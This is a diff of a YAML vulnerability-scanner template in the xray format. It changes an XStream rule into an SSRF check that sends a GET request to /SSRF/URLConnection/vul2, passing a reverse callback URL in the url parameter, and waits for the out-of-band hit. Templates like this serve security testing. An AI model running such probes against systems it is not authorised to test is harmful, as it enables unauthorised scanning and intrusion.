@@ -1,21 +1,22 @@
-name: poc-yaml-example-com
+name: ssrf
 transport: http
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url
+  reverseRMI: reverse.rmi
 rules:
     r1:
         request:
-            cache: true
-            method: POST
+            method: GET
             headers:
-                Content-Type: application/json
+                Content-Type: application/x-www-form-urlencoded
                 Cookies: 
-            path: /XStream/vul
-            body: POST_Data=
-            follow_redirects: true
+            path: /SSRF/URLConnection/vul2?url={{reverseURL}}&getInputStream(...)=
         expression: |
             reverse.wait(5)
 expression:
     r1()
 detail:
-    author: Lousix123
+    author: Lousix
     links:
         - https://docs.xray.cool/
